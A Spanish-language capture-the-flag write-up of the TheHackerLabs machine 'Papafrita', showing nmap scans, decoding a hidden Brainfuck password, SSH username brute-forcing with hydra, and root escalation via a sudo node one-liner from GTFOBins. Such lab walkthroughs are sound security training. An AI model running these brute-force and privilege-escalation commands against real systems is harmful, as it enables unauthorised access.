---
title: "Papafrita - TheHackerLabs"
date: 2025-03-03
draft: false
slug: "THL-writeup-papafrita"
excerpt: "Esta fue una máquina bastante sencilla. Analizando el código fuente de la página web activa de la máquina víctima, encontramos un código oculto que fue hecho en lenguaje Brainfuck. Decodificándolo, descubrimos que parece ser una contraseña. Al no encontrar nada más en la página web, utilizamos la contraseña encontrada para separarla en palabras y usarla con hydra, con tal de probar si se utilizó un usuario para crear la contraseña, siendo que así encontramos un usuario válido. Utilizando las credenciales encontradas, entramos al servicio SSH. Dentro del SSH, vemos los privilegios que tenemos, siendo que podemos utilizar el binario node como Root, que, investigando en la página GTFOBins, encontramos la forma de escalar privilegios."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "SSH", "Apache", "Web Steganography", "Brainfuck Decoding", "Brute Force Attack", "Abusing Sudoers Privileges", "Privesc - Abusing Sudoers Privileges", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "hydra"
  - "grep"
  - "ssh"
  - "sudo"
links:
  - "https://md5decrypt.net/en/Brainfuck-translator/"
  - "https://gtfobins.github.io/gtfobins/node/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-papafrita/Papafrita.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.140
PING 192.168.1.140 (192.168.1.140) 56(84) bytes of data.
64 bytes from 192.168.1.140: icmp_seq=1 ttl=64 time=1.46 ms
64 bytes from 192.168.1.140: icmp_seq=2 ttl=64 time=1.09 ms
64 bytes from 192.168.1.140: icmp_seq=3 ttl=64 time=0.944 ms
64 bytes from 192.168.1.140: icmp_seq=4 ttl=64 time=1.49 ms

--- 192.168.1.140 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3113ms
rtt min/avg/max/mdev = 0.944/1.247/1.493/0.234 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.140 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-03 13:14 CST
Initiating ARP Ping Scan at 13:14
Scanning 192.168.1.140 [1 port]
Completed ARP Ping Scan at 13:14, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:14
Scanning 192.168.1.140 [65535 ports]
Discovered open port 80/tcp on 192.168.1.140
Discovered open port 22/tcp on 192.168.1.140
Completed SYN Stealth Scan at 13:14, 7.88s elapsed (65535 total ports)
Nmap scan report for 192.168.1.140
Host is up, received arp-response (0.0013s latency).
Scanned at 2025-03-03 13:14:17 CST for 8s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.09 seconds
           Raw packets sent: 68671 (3.022MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Parece que solamente hay dos puertos abiertos.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.1.140 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-03 13:14 CST
Nmap scan report for 192.168.1.140
Host is up (0.00093s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))

|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.11 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

La página web solo está mostrando la página por defecto de **Apache2**. Vamos a verla, quizá encontremos algo ahí.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-papafrita/Captura1.png">
</p>

Pues si verdad, solo es la página por defecto de **Apache2**.

Veamos si **Wappalizer** nos dice algo:

<p align="center">
<img src="/assets/images/THL-writeup-papafrita/Captura2.png">
</p>

Nada que nos ayude.

Curiosamente, si revisamos el código fuente podemos encontrar un comentario largo, que parece ser lenguaje **Brainfuck**:

<p align="center">
<img src="/assets/images/THL-writeup-papafrita/Captura3.png">
</p>

Podemos decodificarlo en la siguiente página: <a href="https://md5decrypt.net/en/Brainfuck-translator/" target="_blank">Brainfuck Translator</a>

Y el resultado lo tenemos aquí:

<p align="center">
<img src="/assets/images/THL-writeup-papafrita/Captura4.png">
</p>

Parece ser una contraseña.

No parece haber nada más que podamos hacer, aunque podríamos aplicar **Fuzzing**, pero no encontraremos nada.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Usuarios y Conectandonos al Servicio SSH de la Máquina Víctima {#SSH}

Si bien podríamos usar **hydra** para ver si existe algún usuario al que le pertenezca la contraseña que encontramos, no encontrara a ninguno o tardara demasiado en dar una respuesta. 

Utilice los siguientes wordlists:
* `/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt`
* `/usr/share/metasploit-framework/data/wordlists/unix_users.txt`

Analizando la contraseña, podríamos separarla para ver si el usuario está dentro de la misma contraseña.

Por ejemplo:
```bash
cat users.txt
abuela
calienta
****
```
Salieron 3 palabras.

Usemos esa pequeña lista en **hydra** y veamos si alguna palabra coincide como usuario:
```bash
hydra -L users.txt -p '*****' ssh://192.168.1.140:22
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-03 14:52:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:3/p:1), ~1 try per task
[DATA] attacking ssh://192.168.1.140:22/
[22][ssh] host: 192.168.1.140   login: abuela   password: **********
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-03 14:52:09
```

Excelente, probemos si el **usuario abuela** funciona al conectarnos al **servicio SSH**:
```bash
ssh abuela@192.168.1.140
abuela@192.168.1.140's password: 
Linux papafrita 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
abuela@papafrita:~$ whoami
abuela
```
Estamos dentro.

Si buscamos la palabra **abuela** dentro de `/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt`, podemos encontrar algunas coincidencias:
```bash
cat /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt | grep -n "abuela"
1166972:tuabuelaloca
5327075:fumabuela
7317324:abuelastra
7317325:abuelas2
7317326:abuelaileh
7317327:abuelaadf1
7317328:abuela
```
Hubiera sido muy tardado obtener un resultado exitoso.

## Post Explotación {#Post}

### Escalando Privilegios con Binario node {#node}

Revisando los privilegios que tenemos con este usuario, encontramos que podemos usar un binario como **Root**:
```bash
abuela@papafrita:~$ sudo -l
Matching Defaults entries for abuela on papafrita:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User abuela may run the following commands on papafrita:
    (root) NOPASSWD: /usr/bin/node
```

Podemos buscar ese binario en <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a>:

<p align="center">
<img src="/assets/images/THL-writeup-papafrita/Captura5.png">
</p>

Y ahí mismo, podemos encontrar una forma de escalar privilegios:

<p align="center">
<img src="/assets/images/THL-writeup-papafrita/Captura6.png">
</p>

Probémoslo:
```bash
abuela@papafrita:~$ sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
# whoami
root
# /bin/bash -i 
root@papafrita:/home/abuela#
```
Muy bien, somos **Root**.

Ya solo busquemos las flags:
```bash
root@papafrita:/home/abuela# ls
user.txt
root@papafrita:/home/abuela# cat user.txt 
...
root@papafrita:/home/abuela# cd /root
root@papafrita:~# ls
root.txt
root@papafrita:~# cat root.txt
...
```
Y con esto terminamos la máquina.
